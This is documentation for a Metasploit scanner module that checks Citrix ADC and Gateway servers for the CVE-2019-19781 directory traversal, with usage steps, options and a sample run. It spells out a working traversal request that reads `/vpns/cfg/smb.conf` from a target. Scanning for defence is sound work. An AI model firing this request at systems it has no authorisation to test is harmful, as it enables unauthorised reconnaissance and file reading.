##  Introduction

An issue was discovered in Citrix Application Delivery Controller (ADC) and Gateway 10.5, 11.1, 12.0, 12.1, and 13.0. The vulnerability, tracked as CVE-2019-19781, allows for directory traversal. If exploited, it could allow an unauthenticated attacker to perform arbitrary code execution.

Because vulnerable servers allow for directory traversal, they will accept the request `GET /vpn/../vpns/` and  process it as a request for `GET /vpns/`, a directory that contains PERL scripts that can be targeted to allow for limited file writing on the vulnerable host.

This module checks if a target server is vulnerable by issuing an HTTP GET request for `/vpn/../vpns/cfg/smb.conf`and then checking the response for `global`since this configuration file should contain global variables. If ``global``is found, the server is vulnerable to CVE-2019-19781.

## Verification Steps

1. Install the module as usual

2. Start msfconsole

3. Do: `use auxiliary/scanner/http/citrix_directory_traversal`

4.  Do: `set RHOSTS [IP]`

5. Do: `run`


## Options

1.  `Proxies`  . This option is not set by default.
2.  `RPORT`  . The default setting is  `80`. To use:  `set RPORT [PORT]`
3.  `SSL`  . The default setting is  `false`.
4.  `THREADS`  . The default setting is  `1`.
5.  `VHOST`  . This option is not set by default.

## Scenarios

```
msf5 > use auxiliary/scanner/http/citrix_directory_traversal

msf5 auxiliary(scanner/http/citrix_directory_traversal) > set RHOSTS xxx.xxx.xxx.xxx

RHOSTS => xxx.xxx.xxx.xxx

msf5 auxiliary(scanner/http/citrix_directory_traversal) > run

[*] Found xxx.xxx.xxx.xxx/vpn/../vpns/cfg/smb.conf.
[+] The target is vulnerable to CVE-2019-19781.
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

##  References

1. <https://nvd.nist.gov/vuln/detail/CVE-2019-19781>

2. <https://support.citrix.com/article/CTX267027>